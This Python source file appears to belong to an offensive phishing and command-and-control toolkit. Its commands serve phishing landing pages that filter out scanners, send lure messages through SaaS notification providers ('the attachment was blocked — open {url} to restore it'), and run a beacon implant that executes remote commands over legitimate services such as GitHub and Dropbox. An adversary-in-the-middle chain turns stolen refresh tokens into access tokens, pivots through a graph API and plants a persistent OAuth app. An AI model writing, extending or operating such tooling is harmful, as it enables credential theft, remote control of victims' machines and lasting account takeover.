# language: Python 3.11+, file: cf/cmds_delivery.py
# *delivery & c2 — serve, saaS notify providers, beacon loop, aitm chain*
from __future__ import annotations

import os

from typing import Any

from .cli_core import _as_list, _beacon_exec, _num, emit_json, err, ok, text
from .util import json_dumps, new_token, resolve_secret, run_async


class DeliveryCommands:
    """Delivery group — composed into Cli (cf.cli); self.pos/flags/store and
    the dispatch helpers (_need/_feature/_campaign/_base) live there."""

    def cmd_serve(self) -> None:
        from .server import LandingServer

        server = LandingServer(
            self.store,
            host=str(self.flags.get("host", "127.0.0.1")),
            port=_num(self.flags, "port", 8080, int),
            base_url=str(self.flags.get("url", "")),
            filter_scanners=bool(self.flags.get("filter", False)),
        )
        run_async(
            server.serve_forever(
                ssl_certfile=self.flags.get("cert"),
                ssl_keyfile=self.flags.get("key"),
            )
        )

    # ─── delivery ───


    def cmd_deliver(self) -> None:
        from .delivery import SaaSNotifyDelivery

        self._need(3, "deliver <provider> <campaign> [--token X] [--message M]")
        provider, ref = self.pos[1], self.pos[2]
        camp = self._campaign(ref)
        base = self._base(camp)
        if not base:
            raise SystemExit("--url required (or set it on the campaign)")
        token = resolve_secret(
            str(self.flags.get("token", "")), "SAAS_TOKEN", f"{provider} token: "
        )
        if not token:
            raise SystemExit("no provider token")
        message = str(
            self.flags.get(
                "message",
                "{label}: the attachment was blocked — open {url} to restore it",
            )
        )
        fields: dict[str, Any] = {}
        for item in _as_list(self.flags.get("field")):
            if "=" in str(item):
                k, v = str(item).split("=", 1)
                fields[k] = v
        rows = self.store.targets(camp["id"])
        if self.flags.get("only"):
            only = set(_as_list(self.flags["only"]))
            rows = [t for t in rows if t["token"] in only]
        targets = []
        for t in rows:
            payload = dict(fields)
            payload["message"] = message.format(
                label=t["label"] or t["email"] or "file",
                url=f"{base}/l/{t['token']}",
                token=t["token"],
            )
            payload["bid"] = t["token"]
            payload["channel_name"] = str(
                self.flags.get("channel", f"share-{t['token'][:6]}")
            )
            targets.append({"email": t["email"], **payload})
        if not targets:
            raise SystemExit("no targets")
        delivery = SaaSNotifyDelivery(
            self.store, camp["id"], provider, token
        )
        result = run_async(
            delivery.run_batch(targets, concurrency=int(self.flags.get("concurrency", 4)))
        )
        emit_json({k: v for k, v in result.items() if k != "results"})
        for r in result["results"]:
            if not r.get("result", {}).get("ok"):
                text(f"  fail {r.get('email')}: {r.get('result')}")
        outcome_by_email = {
            str(r["email"]): bool((r.get("result") or {}).get("ok"))
            for r in result["results"]
            if r.get("email")
        }
        for t in rows:
            delivered = outcome_by_email.get(str(t["email"]))
            if delivered is None:
                continue
            self.store.set_status(t["token"], "delivered" if delivered else "dead")
        ok("delivery finished")

    # ─── c2 beacon ───


    def cmd_beacon(self) -> None:
        from .c2 import LegitServiceC2, sign_command, verify_signed

        self._need(2, "beacon <service> --channel C [--token X] [--bid ID]")

        # beacon sign "<payload>" -> paste-ready signed command for the
        # channel; the implant only runs what verifies against the same key
        if self.pos[1] == "sign":
            if len(self.pos) < 3:
                raise SystemExit('beacon sign "<payload>"')
            key = resolve_secret(
                str(self.flags.get("sign", "")), "CF_C2_SIGN_KEY", "c2 signing key: "
            )
            if not key:
                raise SystemExit("no signing key (--sign or CF_C2_SIGN_KEY)")
            print("!" + sign_command(self.pos[2], key))
            return

        service = self.pos[1]
        channel = str(self.flags.get("channel", ""))
        if not channel and service not in ("github", "dropbox"):
            raise SystemExit("--channel required")
        token = resolve_secret(
            str(self.flags.get("token", "")), "C2_TOKEN", f"{service} token: "
        )
        if not token:
            raise SystemExit("no c2 token")
        bid = str(self.flags.get("bid") or new_token(8))
        c2 = LegitServiceC2(
            self.store,
            str(self.flags.get("campaign", "cli")),
            service,
            token,
            channel=channel,
            repo=str(self.flags.get("repo", "")),
            path=str(self.flags.get("path", "beacon.json")),
        )

        interval = _num(self.flags, "interval", 60, float)
        jitter = _num(self.flags, "jitter", 0.3, float)
        max_failures = _num(self.flags, "max-failures", 8, int)
        deadman_url = str(self.flags.get("deadman", ""))

        executor = _beacon_exec
        sign_key = str(self.flags.get("sign", "")) or os.environ.get(
            "CF_C2_SIGN_KEY", ""
        )
        if sign_key:
            def signed_exec(text: str) -> str:
                if not verify_signed(text, sign_key):
                    return "rejected: unsigned command"
                return _beacon_exec(text)

            executor = signed_exec
            ok("signed mode on — implant runs only commands via `beacon sign`")

        where = channel or str(self.flags.get("repo", "")) or "default"
        ok(f"beacon {bid} → {service}:{where} every {interval:g}s (ctrl-c to stop)")
        try:
            run_async(
                c2.run_beacon(
                    bid,
                    executor,
                    poll_interval=interval,
                    jitter=jitter,
                    max_failures=max_failures,
                    deadman_url=deadman_url,
                )
            )
        except KeyboardInterrupt:
            ok("beacon stopped")

    # ─── aitm ───


    def cmd_aitm(self) -> None:
        from .chain import AiTMEdgeChain

        if len(self.pos) < 2:
            err("aitm refresh|pivot|persist")
            raise SystemExit(2)
        sub = self.pos[1]
        chain = AiTMEdgeChain(self.store, str(self.flags.get("campaign", "cli")))

        def _emit(result: Any) -> None:
            print(json_dumps(result))
            if isinstance(result, dict) and result.get("error"):
                raise SystemExit(1)

        if sub == "refresh":
            if len(self.pos) < 4:
                raise SystemExit("aitm refresh <client_id> <refresh_token>")
            _emit(
                run_async(
                    chain.refresh_token_to_access(self.pos[2], self.pos[3])
                )
            )
        elif sub == "pivot":
            if len(self.pos) < 3:
                raise SystemExit("aitm pivot <access_token>")
            what = _as_list(self.flags.get("what")) or None
            _emit(run_async(chain.graph_pivot(self.pos[2], what)))
        elif sub == "persist":
            if len(self.pos) < 4:
                raise SystemExit("aitm persist <tenant> <access_token>")
            _emit(
                run_async(
                    chain.persist_oauth_app(self.pos[2], self.pos[3])
                )
            )
        else:
            err("aitm refresh|pivot|persist")
            raise SystemExit(2)

    # ─── extension ───
